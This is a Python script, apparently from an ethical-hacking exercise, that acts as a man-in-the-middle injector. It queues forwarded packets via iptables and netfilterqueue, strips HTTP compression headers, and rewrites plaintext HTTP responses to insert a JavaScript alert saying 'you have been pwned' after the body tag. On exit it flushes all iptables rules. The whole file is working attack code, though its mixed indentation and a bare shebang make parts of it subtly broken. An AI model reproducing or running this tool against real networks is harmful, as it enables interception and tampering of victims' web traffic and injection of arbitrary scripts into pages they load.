#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import sys
import argparse
import subprocess
from scapy.layers import http
import re
import zlib


def run():
	
	set_iptables()
	create_queue()
	 

def create_queue():
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(1, intercept_packets)
	try:
		queue.run()
	except KeyboardInterrupt:
		print("[+] CTRL + C detected, resetting iptables")
		reset_iptables()
		sys.exit(0)


def set_iptables():
	subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


def reset_iptables():
	subprocess.call(["iptables", "--flush"])

def intercept_packets(packet):
	target_host = "tachibanalaboratories"
	alert_message = "you have been pwned"

	scapy_packet = scapy.IP(packet.get_payload())

	if (scapy_packet.haslayer(http.HTTPRequest)):
	   # print(scapy_packet.show())
	   	http_request = scapy_packet[http.HTTPRequest]
		if scapy_packet[scapy.TCP].dport == 80:
			http_request.Accept_Encoding = ""
			new_packet = set_http(scapy_packet, http_request)
			packet.set_payload(str(new_packet))
			print("req")

	elif (scapy_packet.haslayer(scapy.Raw)):
		load = scapy_packet[scapy.Raw].load

		if (scapy_packet[scapy.TCP].sport == 80):
			load = inject_code_reply(load)
			new_packet = set_load(scapy_packet, load)
			packet.set_payload(str(new_packet))
			new_packet.show()
			print("pwn")
	
	packet.accept()
	


def inject_code_reply(load):
	return load.replace("<body>", "<body><script>alert(\'you have been pwned\');</script>")


def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def set_http(packet, http_layer):
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
	
run()
